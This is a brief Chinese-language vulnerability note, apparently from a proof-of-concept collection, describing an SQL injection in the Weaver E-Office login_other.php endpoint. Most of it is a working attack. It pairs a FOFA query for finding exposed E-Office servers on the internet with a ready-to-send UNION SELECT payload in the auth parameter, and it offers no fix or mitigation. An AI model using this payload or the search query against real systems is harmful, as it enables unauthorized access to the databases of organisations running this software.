## 泛微E-Office系统login_other.php存在sql注入漏洞

泛微E-Office系统/E-mobile/Data/login_other.php?diff=sync&auth=存在sql注入漏洞

## fofa

```
app="泛微-EOffice"
```

## poc

```
/E-mobile/Data/login_other.php?diff=sync&auth={"auths":[{"value":"-1' UNION SELECT 1,2,md5(123456),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%23"}]}
```

![image-20240605101147774](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406051011840.png)